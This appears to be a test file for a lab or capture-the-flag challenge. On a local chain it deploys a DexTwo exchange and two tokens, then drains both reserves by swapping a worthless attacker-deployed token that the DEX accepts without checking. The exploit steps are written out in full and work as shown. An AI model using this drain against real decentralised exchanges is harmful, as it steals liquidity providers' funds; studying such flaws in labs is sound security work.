import { test, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { ethers } from "ethers";
import { readFile } from "node:fs/promises";

const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

const dexArtifact = JSON.parse(
  await readFile("artifacts/contracts/DexTwo.sol/DexTwo.json", "utf8")
);

const tokenArtifact = JSON.parse(
  await readFile(
    "artifacts/contracts/DexTwo.sol/SwappableTokenTwo.json",
    "utf8"
  )
);

const attackerTokenArtifact = JSON.parse(
  await readFile(
    "artifacts/contracts/DexTwoAttackerToken.sol/DexTwoAttackerToken.json",
    "utf8"
  )
);

let signer;
let dex;
let token1;
let token2;
let attackerToken;

beforeEach(async () => {
  signer = await provider.getSigner(1);

  const dexFactory = new ethers.ContractFactory(
    dexArtifact.abi,
    dexArtifact.bytecode,
    signer
  );

  dex = await dexFactory.deploy();
  await dex.waitForDeployment();

  const dexAddress = await dex.getAddress();

  const tokenFactory = new ethers.ContractFactory(
    tokenArtifact.abi,
    tokenArtifact.bytecode,
    signer
  );

  token1 = await tokenFactory.deploy(
    dexAddress,
    "Token One",
    "TK1",
    100
  );
  await token1.waitForDeployment();

  token2 = await tokenFactory.deploy(
    dexAddress,
    "Token Two",
    "TK2",
    100
  );
  await token2.waitForDeployment();

  await (
    await dex.setTokens(
      await token1.getAddress(),
      await token2.getAddress()
    )
  ).wait();

  await (
    await token1.approve(dexAddress, 100)
  ).wait();

  await (
    await token2.approve(dexAddress, 100)
  ).wait();

  await (
    await dex.add_liquidity(await token1.getAddress(), 100)
  ).wait();

  await (
    await dex.add_liquidity(await token2.getAddress(), 100)
  ).wait();

  const attackerFactory = new ethers.ContractFactory(
    attackerTokenArtifact.abi,
    attackerTokenArtifact.bytecode,
    signer
  );

  attackerToken = await attackerFactory.deploy();
  await attackerToken.waitForDeployment();
});

test("drains both DexTwo token reserves using an unapproved token", async () => {
  const dexAddress = await dex.getAddress();
  const attackerTokenAddress = await attackerToken.getAddress();

  await (
    await attackerToken.approve(dexAddress, 1_000_000)
  ).wait();

  // Seed the DEX with one attacker token.
  await (await attackerToken.transfer(dexAddress, 1)).wait();

  // The DEX holds 1 attacker token, so swapping 1 drains token1.
  await (
    await dex.swap(
      attackerTokenAddress,
      await token1.getAddress(),
      1
    )
  ).wait();

  assert.equal(await token1.balanceOf(dexAddress), 0n);

  // The first swap increased the DEX's attacker-token balance to 2.
  // Swap 2 attacker tokens to drain token2.
  await (
    await dex.swap(
      attackerTokenAddress,
      await token2.getAddress(),
      2
    )
  ).wait();

  assert.equal(await token2.balanceOf(dexAddress), 0n);
});

